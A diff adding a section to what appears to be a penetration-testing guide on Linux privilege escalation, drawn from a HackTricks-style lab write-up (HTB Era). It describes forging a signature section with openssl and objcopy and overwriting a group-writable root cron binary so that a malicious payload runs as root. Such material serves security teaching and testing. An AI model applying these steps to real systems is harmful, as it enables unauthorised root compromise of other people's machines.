@@ -503,6 +503,28 @@ If the script executed by root uses a **directory where you have full access**, 
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
 
+### Custom-signed cron binaries with writable payloads
+Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:
+
+1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
+2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
+   ```bash
+   openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
+   ```
+3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
+   ```bash
+   gcc -fPIC -pie monitor.c -o monitor
+   objcopy --add-section .text_sig=cert.pem monitor
+   objcopy --dump-section .text_sig=text_sig_section.bin monitor
+   strings text_sig_section.bin | grep 'Era Inc.'
+   ```
+4. Overwrite the scheduled binary while preserving execute bits:
+   ```bash
+   cp monitor /opt/AV/periodic-checks/monitor
+   chmod 770 /opt/AV/periodic-checks/monitor
+   ```
+5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.
+
 ### Frequent cron jobs
 
 You can monitor the processes to search for processes that are being executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.
@@ -1774,6 +1796,7 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 ## References
 
 - [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
+- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
 - [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
 
 
